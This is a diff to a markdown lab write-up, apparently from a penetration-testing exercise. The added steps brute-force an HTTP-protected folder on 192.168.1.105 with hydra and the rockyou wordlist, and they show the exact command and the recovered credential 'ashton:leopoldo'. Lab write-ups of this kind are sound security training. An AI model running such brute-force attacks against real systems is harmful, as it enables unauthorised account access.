@@ -51,4 +51,19 @@ Steps to set up:
       - Returned 0
     - Scrolled through pages
       - Error file missing please refer to company_folders/secret_folder
-         ![](/Img/web4.png)
+       ![](/Img/web4.png)
+- Run Hydra against http://192.168.1.105/company_folders_secret_folder
+  - Find Wordlist
+    - ```locate rockyou```
+  - ```cd /usr/share/wordlists```
+  - ```ls```
+  - ```gunzip rockyou.txt.gz```
+  - ```ls```
+    - to verify successful unzip
+  - ```hydra help``
+    - To see all avaliable flags
+  - Ashton manages secret folder
+    - Means username is ashton 
+  - ``` hydra -l ashton -P rockyou.txt -s 80  -f -vV 192.168.1.105 http-get /company_folders/secret_folder ```
+    - ```ashton:leopoldo```
+    - ![](/Img/hydra2.png)
